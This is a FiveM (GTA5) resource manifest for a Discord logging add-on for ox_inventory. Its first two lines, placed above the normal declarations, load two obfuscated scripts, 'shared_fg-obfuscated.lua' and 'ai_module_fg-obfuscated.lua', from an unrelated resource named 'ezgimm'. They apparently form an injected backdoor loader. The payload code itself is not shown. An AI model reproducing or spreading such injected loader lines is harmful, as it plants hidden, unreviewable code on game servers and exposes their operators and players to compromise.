shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

fx_version 'cerulean'
game 'gta5'
author 'maku#5434 & softarmy'
description 'discord logs for ox_inventory'
server_scripts {
    'configs/sv_logs.lua',
    'server/sv_oxhook.lua',
    'server/sv_hooks.lua'
}

lua54 'yes'